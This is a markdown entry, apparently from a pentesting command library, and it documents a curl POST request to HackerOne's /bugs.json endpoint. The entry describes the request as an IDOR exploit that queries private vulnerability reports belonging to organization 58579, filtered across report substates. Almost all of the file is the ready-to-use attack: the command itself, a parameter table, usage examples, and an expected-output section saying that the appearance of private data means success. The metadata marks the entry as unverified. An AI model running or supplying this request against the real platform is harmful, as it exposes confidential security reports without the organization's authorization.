---
id: cmd-idor-query-hackerone
data: >-
  curl -X POST 'https://hackerone.com/bugs.json' -H 'Cookie:
  __Host-session=Your-Session-Here' -H 'X-Csrf-Token: Your-Csrf-Here' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-Requested-With: XMLHttpRequest' --data-urlencode 'text_query=1'
  --data-urlencode 'organization_id=58579' --data-urlencode 'persist=true'
  --data-urlencode 'sort_type=pg_search_rank' --data-urlencode 'view=message'
  --data-urlencode 'substates[]=new' --data-urlencode
  'substates[]=needs-more-info' --data-urlencode 'substates[]=triaged'
  --data-urlencode 'substates[]=resolved' --data-urlencode
  'substates[]=informative' --data-urlencode 'substates[]=not-applicable'
  --data-urlencode 'substates[]=duplicate' --data-urlencode
  'substates[]=retesting' --data-urlencode 'substates[]=pending-program-review'
  --data-urlencode 'substates[]=spam' --data-urlencode
  'duplicates_must_have_no_ref=true'
tags:
  - idor
  - http-post
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.246Z'
verified: false
validated: true
submitted: true
---
# hackerone-idor-query-reports

## Command

```bash
curl -X POST 'https://hackerone.com/bugs.json' \
  -H 'Cookie: __Host-session=Your-Session-Here' \
  -H 'X-Csrf-Token: Your-Csrf-Here' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode 'text_query=1' \
  --data-urlencode 'organization_id=58579' \
  --data-urlencode 'persist=true' \
  --data-urlencode 'sort_type=pg_search_rank' \
  --data-urlencode 'view=message' \
  --data-urlencode 'substates[]=new' \
  --data-urlencode 'substates[]=needs-more-info' \
  --data-urlencode 'substates[]=triaged' \
  --data-urlencode 'substates[]=resolved' \
  --data-urlencode 'substates[]=informative' \
  --data-urlencode 'substates[]=not-applicable' \
  --data-urlencode 'substates[]=duplicate' \
  --data-urlencode 'substates[]=retesting' \
  --data-urlencode 'substates[]=pending-program-review' \
  --data-urlencode 'substates[]=spam' \
  --data-urlencode 'duplicates_must_have_no_ref=true'
```

## Description

This curl command exploits IDOR in HackerOne's /bugs.json by querying private reports in organization 58579 for text containing '1', using various substate filters. Use it to test unauthorized access during web pentesting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `text_query` | Search string (e.g., '1') to filter reports | Yes |
| `organization_id` | Target org ID (e.g., 58579) | Yes |
| `persist` | Persist search (true) | No |
| `sort_type` | Sort by pg_search_rank | No |
| `view` | View mode (message) | No |
| `substates[]` | Array of substates to filter | No |
| `duplicates_must_have_no_ref` | Exclude referenced duplicates (true) | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/bugs.json' --data-urlencode 'text_query=1' --data-urlencode 'organization_id=58579' [headers]
```

### Advanced Usage

Add more substates or change query as shown in the main command.

## Expected Output

JSON array of reports: {"reports": [{ "id": 123, "title": "Vuln Title", "state": "new", "severity_rating": "high", ... }]} – indicates success if private data appears.

## Related

- [[Related Procedure|procedures/Query-Private-Reports-via-IDOR-in-bugs-json]]
